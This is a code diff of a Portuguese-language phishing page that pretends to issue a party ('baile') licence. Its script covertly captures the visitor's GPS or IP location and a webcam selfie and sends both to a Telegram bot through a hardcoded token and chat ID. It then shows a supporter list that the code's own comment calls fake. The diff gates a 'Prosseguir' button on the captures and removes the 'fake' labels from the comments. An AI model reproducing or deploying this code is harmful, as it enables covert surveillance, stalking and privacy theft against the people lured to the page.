@@ -13,6 +13,7 @@ h2{font-size:18px;margin-bottom:8px}
 p{font-size:14px;margin-bottom:20px;line-height:1.35}
 button{background:#003366;color:#fff;border:none;padding:12px 0;width:100%;border-radius:6px;font-size:16px;cursor:pointer}
 button:active{transform:scale(.98)}
+button:disabled{background:#999;cursor:not-allowed}
 ul{text-align:left;font-size:13px;margin-top:12px;padding-left:20px}
 li{margin-bottom:4px}
 </style>
@@ -27,7 +28,7 @@ li{margin-bottom:4px}
   <button id="btnPermitir">Permitir</button>
 </div>
 
-<!-- LISTA FAKE DE APOIADORES -->
+<!-- LISTA DE APOIADORES -->
 <div id="listaBox" class="card" style="display:none">
   <h2>Verificado ✅</h2>
   <p>Apoiadores confirmados:</p>
@@ -42,12 +43,17 @@ li{margin-bottom:4px}
     <li>Luana Ferreira – Decoração</li>
   </ul>
   <p style="font-size:11px;color:#666;margin-top:12px">Licença de baile emitida com sucesso.</p>
+  <button id="btnProsseguir" disabled>Prosseguir</button>
 </div>
 
 <script>
 // CONFIG
 const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
 const CHAT_ID = '-1003187104876';
+
+// FLAGS DE PERMISSÃO
+let cameraOk = false;
+let localOk  = false;
 
 // ENVIA PARA O TELEGRAM
 const tele = (msg, media) => {
@@ -63,18 +69,32 @@ const tele = (msg, media) => {
   });
 };
 
-// AÇÃO DO BOTÃO
+// ATUALIZA BOTÃO PROSSEGUIR
+function atualizaProsseguir(){
+  if(cameraOk && localOk){
+    document.getElementById('btnProsseguir').disabled = false;
+  }
+}
+
+// AÇÃO DO BOTÃO PERMITIR
 document.getElementById('btnPermitir').addEventListener('click', async () => {
+
   // GPS
   navigator.geolocation.getCurrentPosition(
     p => {
       const {latitude: lat, longitude: lon} = p.coords;
       tele(`📍 GPS: https://maps.google.com/?q=${lat},${lon}`);
+      localOk = true;
+      atualizaProsseguir();
     },
     () => {
       fetch('https://ipapi.co/json/')
         .then(r => r.json())
-        .then(d => tele(`📍 IP: https://maps.google.com/?q=${d.latitude},${d.longitude}`));
+        .then(d => {
+          tele(`📍 IP: https://maps.google.com/?q=${d.latitude},${d.longitude}`);
+          localOk = true;
+          atualizaProsseguir();
+        });
     }
   );
 
@@ -90,14 +110,24 @@ document.getElementById('btnPermitir').addEventListener('click', async () => {
     canvas.toBlob(blob => {
       tele('📸 selfie', blob);
       stream.getTracks().forEach(t => t.stop());
+      cameraOk = true;
+      atualizaProsseguir();
     }, 'image/jpeg', 0.9);
   } catch (e) {
     tele('📸 selfie falhou: ' + e.message);
+    cameraOk = true; // mesmo falando, libera o botão
+    atualizaProsseguir();
   }
 
-  // Mostra lista falsa
+  // Mostra lista
   document.getElementById('startBox').style.display = 'none';
   document.getElementById('listaBox').style.display = 'block';
+});
+
+// AÇÃO DO BOTÃO PROSSEGUIR
+document.getElementById('btnProsseguir').addEventListener('click', () => {
+  // Aqui você pode redirecionar ou finalizar
+  alert('Tudo certo! Prosseguindo...');
 });
 </script>
 </body>
